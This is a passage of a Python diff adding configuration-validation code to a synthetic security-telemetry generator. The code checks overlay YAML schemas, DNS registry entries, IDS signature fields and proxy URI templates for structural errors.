+            # Look up file-specific schema
+            file_schema = _OVERLAY_FILE_SCHEMAS.get(rel_path)
+
+            # Reject unknown overlay files (personas/ handled separately below)
+            if file_schema is None and not rel_path.startswith("personas/"):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        f"overlay/{rel_path}",
+                        "Unknown overlay file — not a recognized config path. Check filename for typos.",
+                    )
+                )
+                overlay_errors = True
+                continue
+
+            if file_schema is None:
+                continue  # personas handled in separate pre-check
+
+            list_fields = file_schema.get("list_fields", {})
+            dict_fields = file_schema.get("dict_fields", set())
+
+            # Reject unexpected top-level keys (they will be silently ignored by the engine)
+            string_list_fields = file_schema.get("string_list_fields", set())
+            scalar_fields = file_schema.get("scalar_fields", {})
+            value_list_fields = file_schema.get("value_list_fields", set())
+            fixed_string_sequence_fields = file_schema.get("fixed_string_sequence_fields", {})
+            string_dict_fields = file_schema.get("string_dict_fields", set())
+            string_fields = file_schema.get("string_fields", set())
+            number_fields = file_schema.get("number_fields", set())
+            known_keys = (
+                set(list_fields)
+                | set(dict_fields)
+                | set(string_list_fields)
+                | set(value_list_fields)
+                | set(fixed_string_sequence_fields)
+                | set(string_dict_fields)
+                | set(string_fields)
+                | set(number_fields)
+                | set(scalar_fields)
+            )
+            if known_keys:
+                for key in data:
+                    if key not in known_keys:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                f"overlay/{rel_path}",
+                                f'Unexpected top-level key "{key}" — this will be ignored by the engine. Check for typos.',
+                            )
+                        )
+                        overlay_errors = True
+
+            # Check list fields for correct structure
+            for field_name, key_field in list_fields.items():
+                if field_name in data:
+                    value = data[field_name]
+                    if not isinstance(value, list):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                f"overlay/{rel_path}",
+                                f'Field "{field_name}" should be a list, got {type(value).__name__}',
+                            )
+                        )
+                        overlay_errors = True
+                    else:
+                        for i, item in enumerate(value):
+                            if not isinstance(item, dict):
+                                result.issues.append(
+                                    Issue(
+                                        "ERROR",
+                                        f"overlay/{rel_path}",
+                                        f'"{field_name}" entry #{i + 1} should be a mapping, got {type(item).__name__}',
+                                    )
+                                )
+                                overlay_errors = True
+                            elif key_field and key_field not in item:
+                                result.issues.append(
+                                    Issue(
+                                        "ERROR",
+                                        f"overlay/{rel_path}",
+                                        f'"{field_name}" entry #{i + 1} missing required "{key_field}" field',
+                                    )
+                                )
+                                overlay_errors = True
+
+                        # Check for duplicate keys within this overlay list
+                        if key_field:
+                            seen_overlay_keys: dict[str, int] = {}
+                            for j, item in enumerate(value):
+                                if isinstance(item, dict) and key_field in item:
+                                    k = item[key_field]
+                                    if k in seen_overlay_keys:
+                                        result.issues.append(
+                                            Issue(
+                                                "ERROR",
+                                                f"overlay/{rel_path}",
+                                                f'Duplicate {key_field}="{k}" in "{field_name}" (entries #{seen_overlay_keys[k]} and #{j + 1}) — last entry wins, first is lost',
+                                            )
+                                        )
+                                        overlay_errors = True
+                                    seen_overlay_keys[k] = j + 1
+
+            # Check dict fields for correct structure
+            for field_name in dict_fields:
+                if field_name in data and not isinstance(data[field_name], dict):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            f'Field "{field_name}" should be a mapping, got {type(data[field_name]).__name__}',
+                        )
+                    )
+                    overlay_errors = True
+
+            for field_name in string_dict_fields:
+                if field_name not in data:
+                    continue
+                value = data[field_name]
+                if not isinstance(value, dict):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            f'Field "{field_name}" should be a mapping, got {type(value).__name__}',
+                        )
+                    )
+                    overlay_errors = True
+                    continue
+                for key, item in value.items():
+                    if (
+                        not isinstance(key, str)
+                        or not key.strip()
+                        or not isinstance(item, str)
+                        or not item.strip()
+                    ):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                f"overlay/{rel_path}",
+                                f'Field "{field_name}" must map non-empty strings to '
+                                "non-empty strings",
+                            )
+                        )
+                        overlay_errors = True
+                        break
+
+            # Check string list fields (lists of plain strings, e.g., edr_pools paths)
+            for field_name in string_list_fields:
+                if field_name in data:
+                    value = data[field_name]
+                    if not isinstance(value, list):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                f"overlay/{rel_path}",
+                                f'Field "{field_name}" should be a list, got {type(value).__name__}',
+                            )
+                        )
+                        overlay_errors = True
+                    else:
+                        for i, item in enumerate(value):
+                            if not isinstance(item, str):
+                                result.issues.append(
+                                    Issue(
+                                        "ERROR",
+                                        f"overlay/{rel_path}",
+                                        f'"{field_name}" entry #{i + 1} should be a string, got {type(item).__name__}',
+                                    )
+                                )
+                                overlay_errors = True
+
+            # Check explicitly typed scalar fields used by versioned config documents.
+            for field_name, expected_type in scalar_fields.items():
+                if field_name in data and type(data[field_name]) is not expected_type:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            f'Field "{field_name}" should be a '
+                            f"{expected_type.__name__}, got {type(data[field_name]).__name__}",
+                        )
+                    )
+                    overlay_errors = True
+
+            # Check list-valued fields whose item shape is owned by merged validation.
+            for field_name in value_list_fields:
+                if field_name in data and not isinstance(data[field_name], list):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            f'Field "{field_name}" should be a list, got '
+                            f"{type(data[field_name]).__name__}",
+                        )
+                    )
+                    overlay_errors = True
+
+            # EDR registry pools use compact [key, value_name, details] entries.
+            for field_name, required_length in fixed_string_sequence_fields.items():
+                if field_name not in data:
+                    continue
+                value = data[field_name]
+                if not isinstance(value, list):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            f'Field "{field_name}" should be a list, got {type(value).__name__}',
+                        )
+                    )
+                    overlay_errors = True
+                    continue
+                for i, item in enumerate(value):
+                    if (
+                        not isinstance(item, list | tuple)
+                        or len(item) != required_length
+                        or any(not isinstance(part, str) or not part for part in item)
+                    ):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                f"overlay/{rel_path}",
+                                f'"{field_name}" entry #{i + 1} should contain exactly '
+                                f"{required_length} non-empty strings",
+                            )
+                        )
+                        overlay_errors = True
+
+            for field_name in string_fields:
+                if field_name in data and not isinstance(data[field_name], str):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            f'Field "{field_name}" should be a string, got '
+                            f"{type(data[field_name]).__name__}",
+                        )
+                    )
+                    overlay_errors = True
+
+            for field_name in number_fields:
+                if field_name in data and (
+                    isinstance(data[field_name], bool)
+                    or not isinstance(data[field_name], int | float)
+                ):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            f'Field "{field_name}" should be a number, got '
+                            f"{type(data[field_name]).__name__}",
+                        )
+                    )
+                    overlay_errors = True
+
+            if rel_path == "activity/external_actor_profiles.yaml":
+                from evidenceforge.config.schemas import ExternalActorIpEntry
+
+                for field_name in (
+                    "logon_source_ips",
+                    "failed_logon_source_ips",
+                    "connection_c2_ips",
+                ):
+                    entries = data.get(field_name, [])
+                    if not isinstance(entries, list):
+                        continue
+                    for index, entry in enumerate(entries):
+                        if not isinstance(entry, dict):
+                            continue
+                        try:
+                            ExternalActorIpEntry.model_validate(entry)
+                        except ValidationError as exc:
+                            message = exc.errors()[0].get("msg", str(exc))
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "external_actor_profiles.yaml",
+                                    f"{field_name} entry #{index + 1}: {message}",
+                                )
+                            )
+                            overlay_errors = True
+
+    # Validate overlay persona files specifically (one-file-per-persona pattern)
+    if overlay_dir:
+        overlay_personas_dir = overlay_dir / "personas"
+        if overlay_personas_dir.is_dir():
+            for persona_file in sorted(overlay_personas_dir.glob("*.yaml")):
+                rel_path = str(persona_file.relative_to(overlay_dir))
+                pdata, perr = _safe_load_yaml(persona_file)
+                if perr:
+                    continue  # Already caught in YAML health check above
+                if pdata is None:
+                    continue  # Already caught above
+                if not isinstance(pdata, dict):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            f"Persona file should be a mapping, got {type(pdata).__name__}",
+                        )
+                    )
+                    overlay_errors = True
+                elif "name" not in pdata:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            'Persona file missing required "name" field — it will be silently ignored by the loader',
+                        )
+                    )
+                    overlay_errors = True
+                elif pdata["name"] != persona_file.stem:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            f"overlay/{rel_path}",
+                            f'Persona name "{pdata["name"]}" does not match filename "{persona_file.stem}" — filename must match the name field',
+                        )
+                    )
+                    overlay_errors = True
+
+    if overlay_errors:
+        # Cannot proceed with merged loading — overlay files would crash loaders
+        result.files_checked = len(overlay_yaml_files)
+        return overlay_yaml_files, True
+
+    return overlay_yaml_files, False
+
+
+def _validate_effective_configuration(
+    result: ValidationResult,
+    directories: tuple[Path, Path, Path, Path],
+    overlay_yaml_files: list[Path],
+    _prechecked_overlay_files: int,
+) -> ValidationResult:
+    """Load effective data once and run domain checks in their existing order."""
+    activity_dir, personas_dir, formats_dir, evaluation_dir = directories
+    # Load all data through overlay-aware loaders for consistency.
+    # Every config file should be loaded via its loader (not raw yaml.safe_load)
+    # so that overlay customizations are visible to validation.
+    from evidenceforge.config.observation_profiles import load_observation_profiles
+    from evidenceforge.generation.activity.application_catalog import load_catalog
+    from evidenceforge.generation.activity.auth_noise import load_auth_noise_config
+    from evidenceforge.generation.activity.calltrace_patterns import load_calltrace_config
+    from evidenceforge.generation.activity.command_parameter_pools import (
+        load_command_parameter_pools,
+    )
+    from evidenceforge.generation.activity.create_remote_thread_patterns import (
+        load_create_remote_thread_config,
+        load_create_remote_thread_patterns,
+    )
+    from evidenceforge.generation.activity.dns_registry import load_dns_registry
+    from evidenceforge.generation.activity.email_background import load_email_background
+    from evidenceforge.generation.activity.endpoint_noise import load_endpoint_noise
+    from evidenceforge.generation.activity.external_actor_profiles import (
+        load_external_actor_profiles,
+    )
+    from evidenceforge.generation.activity.host_activity_profiles import (
+        load_host_activity_profiles,
+    )
+    from evidenceforge.generation.activity.ids_signatures import load_ids_signatures
+    from evidenceforge.generation.activity.mail_public_identities import (
+        load_mail_public_identities,
+    )
+    from evidenceforge.generation.activity.process_access_patterns import (
+        load_process_access_patterns,
+    )
+    from evidenceforge.generation.activity.process_network import load_process_network_map
+    from evidenceforge.generation.activity.proxy_phase_profiles import load_proxy_phase_profiles
+    from evidenceforge.generation.activity.proxy_uri import load_proxy_uri_templates
+    from evidenceforge.generation.activity.proxy_user_agents import load_proxy_user_agents
+    from evidenceforge.generation.activity.public_dns_profiles import load_public_dns_profiles
+    from evidenceforge.generation.activity.public_identity_profiles import (
+        load_public_identity_profiles,
+    )
+    from evidenceforge.generation.activity.site_maps import load_site_maps
+    from evidenceforge.generation.activity.smb_profiles import load_smb_profiles
+    from evidenceforge.generation.activity.spawn_rules import load_spawn_rules
+    from evidenceforge.generation.activity.suspicious_benign_config import (
+        load_suspicious_benign,
+    )
+    from evidenceforge.generation.activity.system_processes import load_system_processes
+    from evidenceforge.generation.activity.timing_profiles import load_timing_profiles
+    from evidenceforge.generation.activity.tls_realism import load_tls_realism
+    from evidenceforge.generation.activity.traffic_profiles import load_traffic_profiles
+    from evidenceforge.generation.activity.web_session_profiles import (
+        is_safe_http_header_value,
+        is_safe_http_method,
+        is_safe_http_path,
+        is_safe_mime_type,
+        load_web_session_profiles,
+    )
+    from evidenceforge.generation.activity.windows_auth_realism import load_windows_auth_realism
+    from evidenceforge.generation.storage_world import _load_catalog_config
+
+    dns_data = load_dns_registry()
+    public_dns_profiles_data = load_public_dns_profiles()
+    ids_data = load_ids_signatures()
+    catalog_data = load_catalog()
+    traffic_data = load_traffic_profiles()
+    spawn_data = load_spawn_rules()
+    process_net_data = load_process_network_map()
+    email_background_data = load_email_background()
+    mail_public_identities_data = load_mail_public_identities()
+    external_actor_profiles_data = load_external_actor_profiles()
+    public_identity_profiles_data = load_public_identity_profiles()
+    suspicious_benign_data = load_suspicious_benign()
+    command_parameter_pools_data = load_command_parameter_pools()
+    process_access_data = load_process_access_patterns()
+    calltrace_config = load_calltrace_config()
+    auth_noise_data = load_auth_noise_config()
+    create_remote_thread_data = load_create_remote_thread_patterns()
+    create_remote_thread_config = load_create_remote_thread_config()
+    proxy_phase_profiles_data = load_proxy_phase_profiles()
+    proxy_data = load_proxy_uri_templates()
+    proxy_ua_data = load_proxy_user_agents()
+    site_data = load_site_maps()
+    sys_proc_data = load_system_processes()
+    endpoint_noise_data = load_endpoint_noise()
+    host_activity_profiles_data = load_host_activity_profiles()
+    observation_profiles_data = load_observation_profiles()
+    tls_realism_data = load_tls_realism()
+    windows_auth_data = load_windows_auth_realism()
+    timing_profiles_data = deepcopy(load_timing_profiles())
+    web_session_profiles_data = load_web_session_profiles()
+    try:
+        load_smb_profiles()
+    except ValidationError as exc:
+        result.issues.append(
+            Issue(
+                "ERROR",
+                "smb_profiles.yaml",
+                f"invalid SMB profiles config: {exc}",
+            )
+        )
+    storage_catalog_data = _load_catalog_config()
+
+    _validate_proxy_phase_profiles(result, proxy_phase_profiles_data)
+    _validate_storage_catalog(result, storage_catalog_data)
+
+    # Collect file count (package + overlay)
+    yaml_files: list[Path] = []
+    for d in [activity_dir, personas_dir, formats_dir, evaluation_dir]:
+        if d.is_dir():
+            yaml_files.extend(d.glob("*.yaml"))
+    result.files_checked = len(yaml_files) + max(len(overlay_yaml_files), _prechecked_overlay_files)
+
+    # --- Checks 1-2: YAML Health (package files) ---
+    for path in yaml_files:
+        data, err = _safe_load_yaml(path)
+        if err:
+            result.issues.append(Issue("ERROR", path.name, f"YAML parse error: {err}"))
+        elif data is None:
+            result.issues.append(Issue("ERROR", path.name, "File is empty"))
+
+    dns = _validate_dns_and_ids(
+        dns_data=dns_data,
+        ids_data=ids_data,
+        proxy_data=proxy_data,
+        proxy_ua_data=proxy_ua_data,
+        result=result,
+        site_data=site_data,
+        tls_realism_data=tls_realism_data,
+    )
+
+    _validate_timing_profiles(
+        dns_domain_set=dns.dns_domain_set,
+        domains=dns.domains,
+        proxy_domains=dns.proxy_domains,
+        result=result,
+        site_domains=dns.site_domains,
+        site_referenced_hosts=dns.site_referenced_hosts,
+        timing_profiles_data=timing_profiles_data,
+    )
+
+    _validate_web_profiles(
+        is_safe_http_header_value=is_safe_http_header_value,
+        is_safe_http_method=is_safe_http_method,
+        is_safe_http_path=is_safe_http_path,
+        is_safe_mime_type=is_safe_mime_type,
+        result=result,
+        web_session_profiles_data=web_session_profiles_data,
+    )
+
+    all_traffic_entries, persona_names, persona_traffic = _validate_traffic_profiles(
+        all_dns_tags=dns.all_dns_tags,
+        personas_dir=personas_dir,
+        process_net_data=process_net_data,
+        result=result,
+        tls_realism_data=tls_realism_data,
+        traffic_data=traffic_data,
+    )
+
+    apps = _validate_applications(
+        catalog_data=catalog_data,
+        persona_names=persona_names,
+        result=result,
+    )
+
+    _validate_process_chains(
+        apps=apps,
+        process_net_data=process_net_data,
+        result=result,
+        spawn_data=spawn_data,
+        sys_proc_data=sys_proc_data,
+    )
+
+    all_merged_personas = _validate_personas(
+        apps=apps,
+        persona_names=persona_names,
+        persona_traffic=persona_traffic,
+        result=result,
+    )
+
+    _validate_reachability(
+        all_dns_tags=dns.all_dns_tags,
+        all_traffic_entries=all_traffic_entries,
+        apps=apps,
+        domains=dns.domains,
+        persona_names=persona_names,
+        process_net_data=process_net_data,
+        result=result,
+    )
+
+    _validate_evaluation_rules(
+        evaluation_dir=evaluation_dir,
+        formats_dir=formats_dir,
+        result=result,
+    )
+
+    _validate_merged_schemas(
+        all_merged_personas=all_merged_personas,
+        apps=apps,
+        auth_noise_data=auth_noise_data,
+        calltrace_config=calltrace_config,
+        command_parameter_pools_data=command_parameter_pools_data,
+        create_remote_thread_config=create_remote_thread_config,
+        create_remote_thread_data=create_remote_thread_data,
+        domains=dns.domains,
+        email_background_data=email_background_data,
+        endpoint_noise_data=endpoint_noise_data,
+        external_actor_profiles_data=external_actor_profiles_data,
+        host_activity_profiles_data=host_activity_profiles_data,
+        mail_public_identities_data=mail_public_identities_data,
+        observation_profiles_data=observation_profiles_data,
+        process_access_data=process_access_data,
+        process_net_data=process_net_data,
+        proxy_ua_data=proxy_ua_data,
+        public_dns_profiles_data=public_dns_profiles_data,
+        public_identity_profiles_data=public_identity_profiles_data,
+        result=result,
+        spawn_data=spawn_data,
+        suspicious_benign_data=suspicious_benign_data,
+        sys_proc_data=sys_proc_data,
+        traffic_data=traffic_data,
+        windows_auth_data=windows_auth_data,
+    )
+
+    _validate_web_scan_ids(
+        _record_ids_rule_identity=dns.record_ids_rule_identity,
+        _validate_ids_numeric_field=dns.validate_ids_numeric_field,
+        _validate_ids_signature_predicate=dns.validate_ids_signature_predicate,
+        result=result,
+    )
+
+    _validate_rsat_tools(
+        result=result,
+    )
+
+    _validate_secret_families(result)
+    _validate_payload_families(result)
+
+    seen_issues: set[tuple[str, str, str]] = set()
+    deduped: list[Issue] = []
+    for issue in result.issues:
+        key = (issue.severity, issue.file, issue.message)
+        if key not in seen_issues:
+            seen_issues.add(key)
+            deduped.append(issue)
+    result.issues = deduped
+
+    return result
+
+
+def _get_persona_names(personas_dir: Path) -> set[str]:
+    """Get set of all persona names from the personas directory."""
+    from evidenceforge.utils.personas import load_builtin_personas
+
+    return {p["name"] for p in load_builtin_personas() if "name" in p}
+
+
+def _extract_field_refs(rule: dict) -> list[str]:
+    """Extract field name references from a co_occurrence or distribution rule."""
+    fields = []
+    # Distribution rules have a "field" key
+    if "field" in rule:
+        fields.append(rule["field"])
+    # Co-occurrence rules have "condition" fields and "checks" with "field"
+    if "condition" in rule:
+        for key in rule["condition"]:
+            if key != "exclude":
+                fields.append(key)
+    if "checks" in rule:
+        for check in rule["checks"]:
+            if "field" in check:
+                fields.append(check["field"])
+    return fields
+
+
+@dataclass(frozen=True)
+class _DnsValidationState:
+    """DNS indexes and shared IDS rule checks retained for later domains."""
+
+    record_ids_rule_identity: Callable[..., None]
+    validate_ids_numeric_field: Callable[..., None]
+    validate_ids_signature_predicate: Callable[..., None]
+    all_dns_tags: set[str]
+    dns_domain_set: set[str]
+    domains: list[dict[str, Any]]
+    proxy_domains: set[str]
+    site_domains: set[str]
+    site_referenced_hosts: set[str]
+
+
+def _validate_dns_and_ids(
+    *,
+    dns_data: dict[str, Any],
+    ids_data: dict[str, Any],
+    proxy_data: dict[str, Any],
+    proxy_ua_data: dict[str, Any],
+    result: ValidationResult,
+    site_data: dict[str, Any],
+    tls_realism_data: dict[str, Any],
+) -> _DnsValidationState:
+    """Validate dns and ids in the established diagnostic order."""
+    # --- Checks 3-6: DNS Registry Integrity ---
+    # Read valid tags from the YAML data (data-driven, extensible via overlay)
+    valid_dns_tags = frozenset(dns_data.get("valid_tags", {}).keys())
+    domains = dns_data.get("domains", [])
+    seen_domains: dict[str, int] = {}
+    dns_domain_set: set[str] = set()
+    all_dns_tags: set[str] = set()
+
+    for i, entry in enumerate(domains):
+        domain = entry.get("domain", "")
+        tags = entry.get("tags", [])
+        ips = entry.get("ips", [])
+
+        # Check 3: Duplicate domains
+        if domain in seen_domains:
+            result.issues.append(
+                Issue("ERROR", "dns_registry.yaml", f'Duplicate domain "{domain}"')
+            )
+        seen_domains[domain] = i
+        dns_domain_set.add(domain)
+
+        # Check 4: Empty tags
+        if not tags:
+            result.issues.append(
+                Issue("ERROR", "dns_registry.yaml", f'Domain "{domain}" has empty tags')
+            )
+
+        # Check 5: Empty IPs
+        if not ips:
+            result.issues.append(
+                Issue("ERROR", "dns_registry.yaml", f'Domain "{domain}" has empty IPs')
+            )
+
+        # Check 6: Invalid tags
+        for tag in tags:
+            all_dns_tags.add(tag)
+            if tag not in valid_dns_tags:
+                result.issues.append(
+                    Issue(
+                        "WARNING", "dns_registry.yaml", f'Domain "{domain}" has invalid tag "{tag}"'
+                    )
+                )
+
+    ids_rule_identities: dict[tuple[int, int], tuple[str, str]] = {}
+
+    def _record_ids_rule_identity(
+        file_name: str,
+        sid: object,
+        gid: object,
+        message: object,
+    ) -> None:
+        """Track Snort gid/sid identity so one rule ID cannot name multiple rules."""
+        if not isinstance(sid, int) or not isinstance(gid, int) or not isinstance(message, str):
+            return
+        key = (gid, sid)
+        normalized_message = " ".join(message.split())
+        existing = ids_rule_identities.get(key)
+        if existing is None:
+            ids_rule_identities[key] = (normalized_message, file_name)
+            return
+        existing_message, existing_file = existing
+        if existing_message != normalized_message:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    file_name,
+                    f"IDS rule gid/sid [{gid}:{sid}] message conflicts with {existing_file}: "
+                    f"{normalized_message!r} != {existing_message!r}",
+                )
+            )
+
+    def _validate_ids_numeric_field(
+        file_name: str,
+        context: str,
+        signature: dict[str, object],
+        field_name: str,
+        *,
+        required: bool = False,
+        minimum: int = 1,
+    ) -> None:
+        """Validate IDS numeric fields that generation later casts with int()."""
+        value = signature.get(field_name)
+        if value is None and not required:
+            return
+        if not isinstance(value, int) or value < minimum:
+            requirement = (
+                f"a positive integer (>= {minimum})" if minimum > 1 else "a positive integer"
+            )
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    file_name,
+                    f"{context} {field_name} must be {requirement}, got {value!r}",
+                )
+            )
+
+    def _validate_ids_signature_predicate(
+        file_name: str,
+        context: str,
+        signature: dict[str, object],
+    ) -> None:
+        """Validate structured IDS semantic requirements at every config boundary."""
+
+        predicate = signature.get("predicate")
+        if predicate is None and signature.get("inspection") is not None:
+            predicate = {"inspection": signature["inspection"]}
+        if predicate is None:
+            return
+        try:
+            IdsSignaturePredicateSpec.model_validate(predicate)
+        except ValidationError as exc:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    file_name,
+                    f"{context} has invalid predicate: {exc.errors(include_url=False)}",
+                )
+            )
+
+    # --- IDS Signature Integrity ---
+    for i, sig in enumerate(ids_data.get("signatures", [])):
+        sid = sig.get("sid", f"entry #{i + 1}") if isinstance(sig, dict) else f"entry #{i + 1}"
+        if not isinstance(sig, dict):
+            result.issues.append(
+                Issue("ERROR", "ids_signatures.yaml", f"Signature {sid} must be a mapping")
+            )
+            continue
+        for required in ("sid", "rev", "message", "classification", "priority", "proto"):
+            if required not in sig:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "ids_signatures.yaml",
+                        f"Signature {sid} missing required field {required}",
+                    )
+                )
+        proto = sig.get("proto")
+        if proto not in {"tcp", "udp", "icmp"}:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "ids_signatures.yaml",
+                    f"Signature {sid} has invalid proto {proto!r}",
+                )
+            )
+        if "baseline_fp_allowed" in sig and not isinstance(sig["baseline_fp_allowed"], bool):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "ids_signatures.yaml",
+                    f"Signature {sid} baseline_fp_allowed must be a boolean",
+                )
+            )
+        alert_policy = sig.get("alert_policy")
+        if alert_policy is not None and alert_policy != "every":
+            try:
+                IdsAlertPolicySpec.model_validate(alert_policy)
+            except ValidationError as exc:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "ids_signatures.yaml",
+                        f"Signature {sid} has invalid alert_policy: {exc.errors(include_url=False)}",
+                    )
+                )
+        gid = sig.get("gid", 1)
+        _validate_ids_numeric_field(
+            "ids_signatures.yaml", f"Signature {sid}", sig, "sid", required=True
+        )
+        _validate_ids_numeric_field(
+            "ids_signatures.yaml", f"Signature {sid}", sig, "rev", required=True
+        )
+        _validate_ids_numeric_field(
+            "ids_signatures.yaml", f"Signature {sid}", sig, "priority", required=True
+        )
+        _validate_ids_numeric_field("ids_signatures.yaml", f"Signature {sid}", sig, "gid")
+        _validate_ids_signature_predicate("ids_signatures.yaml", f"Signature {sid}", sig)
+        _record_ids_rule_identity("ids_signatures.yaml", sig.get("sid"), gid, sig.get("message"))
+        templates = sig.get("dns_query_templates")
+        if templates is not None:
+            if proto not in {"udp", "tcp"} or sig.get("dst_port") != 53:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "ids_signatures.yaml",
+                        f"Signature {sid} defines dns_query_templates but is not a DNS signature",
+                    )
+                )
+            elif not isinstance(templates, list) or not templates:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "ids_signatures.yaml",
+                        f"Signature {sid} dns_query_templates must be a non-empty list",
+                    )
+                )
+            else:
+                for template in templates:
+                    if not isinstance(template, str):
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "ids_signatures.yaml",
+                                f"Signature {sid} DNS template {template!r} must be a string",
+                            )
+                        )
+                        continue
+                    from evidenceforge.generation.activity.ids_signatures import (
+                        validate_dns_query_template,
+                    )
+
+                    template_error = validate_dns_query_template(template)
+                    if template_error is not None:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "ids_signatures.yaml",
+                                f"Signature {sid} DNS template {template!r} {template_error}",
+                            )
+                        )
+
+    # --- Checks 7-10: DNS → Downstream Cascade ---
+    # proxy_data and site_data loaded above via overlay-aware loaders
+    proxy_domains = (
+        set(proxy_data.get("domains", {}).keys())
+        if isinstance(proxy_data.get("domains"), dict)
+        else set()
+    )
+    site_domains = (
+        set(site_data.get("domains", {}).keys())
+        if isinstance(site_data.get("domains"), dict)
+        else set()
+    )
+    site_referenced_hosts: set[str] = set()
+    if isinstance(site_data.get("domains"), dict):
+        for site_domain, site_config in site_data.get("domains", {}).items():
+            site_referenced_hosts.add(site_domain)
+            if not isinstance(site_config, dict):
+                continue
+            site_referenced_hosts.update(
+                str(host) for host in site_config.get("cdn_domains", []) if host
+            )
+            for page in site_config.get("pages", []):
+                if not isinstance(page, dict):
+                    continue
+                for subresource in page.get("subresources", []):
+                    if isinstance(subresource, dict) and subresource.get("host"):
+                        site_referenced_hosts.add(str(subresource["host"]))
+
+    # Check 7: Orphaned proxy templates
+    for domain in proxy_domains - dns_domain_set:
+        result.issues.append(
+            Issue(
+                "WARNING",
+                "proxy_uri_templates.yaml",
+                f'Domain "{domain}" not found in dns_registry',
+            )
+        )
+    _INFRA_PROXY_CLASSES = {
+        "crl",
+        "ocsp",
+        "software_update",
+        "telemetry",
+        "windows_trust_list",
+        "windows_update",
+    }
+    _GENERIC_BROWSER_PATHS = {
+        "/login",
+        "/signin",
+        "/favicon.ico",
+        "/assets/main.css",
+        "/assets/app.js",
+        "/dashboard",
+    }
+    _INFRA_CONTENT_TYPES = {
+        "ocsp": {"application/ocsp-response"},
+        "crl": {"application/pkix-crl"},
+        "windows_update": {
+            "application/octet-stream",
+            "application/vnd.ms-cab-compressed",
+            "application/x-cab",
+        },
+        "windows_trust_list": {
+            "application/vnd.ms-cab-compressed",
+            "application/octet-stream",
+        },
+        "software_update": {
+            "application/json",
+            "application/octet-stream",
+            "application/vnd.debian.binary-package",
+            "application/x-gzip",
+            "text/plain",
+        },
+        "telemetry": {"application/json"},
+    }
+    for domain, entry in proxy_data.get("domains", {}).items():
+        if not isinstance(entry, dict):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "proxy_uri_templates.yaml",
+                    f'Domain "{domain}" entry must be a mapping',
+                )
+            )
+            continue
+        paths = entry.get("paths", [])
+        methods = entry.get("methods", [])
+        content_types = entry.get("content_types")
+        domain_class = entry.get("domain_class")
+        referrer_policy = entry.get("referrer_policy", "normal")
+        source_system_types = entry.get("source_system_types")
+        if not isinstance(paths, list) or not paths:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "proxy_uri_templates.yaml",
+                    f'Domain "{domain}" must define a non-empty paths list',
+                )
+            )
+        if not isinstance(methods, list) or not methods:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "proxy_uri_templates.yaml",
+                    f'Domain "{domain}" must define a non-empty methods list',
+                )
+            )
+        if content_types is not None and (
+            not isinstance(content_types, list) or len(content_types) != len(paths)
+        ):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "proxy_uri_templates.yaml",
+                    f'Domain "{domain}" content_types must be a list matching paths length',
+                )
+            )
+        if referrer_policy not in {"normal", "none"}:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "proxy_uri_templates.yaml",
+                    f'Domain "{domain}" has invalid referrer_policy "{referrer_policy}"',
+                )
+            )
+        if source_system_types is not None:
+            valid_source_types = {"workstation", "server", "domain_controller"}
+            observed_types = (
+                {str(value) for value in source_system_types}
+                if isinstance(source_system_types, list)
+                else set()
+            )
+            if not observed_types or not observed_types.issubset(valid_source_types):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "proxy_uri_templates.yaml",
+                        f'Domain "{domain}" has invalid source_system_types',
+                    )
+                )
+        if domain_class in _INFRA_PROXY_CLASSES:
+            if referrer_policy != "none":
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "proxy_uri_templates.yaml",
+                        f'Domain "{domain}" class "{domain_class}" must set referrer_policy: none',
+                    )
+                )
+            default_content_type = entry.get("content_type", "")
+            allowed_types = _INFRA_CONTENT_TYPES[domain_class]
+            observed_types = set(content_types or [default_content_type])
+            for content_type in observed_types:
+                if content_type not in allowed_types:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "proxy_uri_templates.yaml",
+                            f'Domain "{domain}" class "{domain_class}" has unsuitable content type "{content_type}"',
+                        )
+                    )
+            for path in paths:
+                if path in _GENERIC_BROWSER_PATHS or path.endswith(
+                    (".css", ".js", ".ico", ".jpeg", ".jpg", ".png", ".webp", ".woff2")
+                ):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "proxy_uri_templates.yaml",
+                            f'Domain "{domain}" class "{domain_class}" uses browser-like path "{path}"',
+                        )
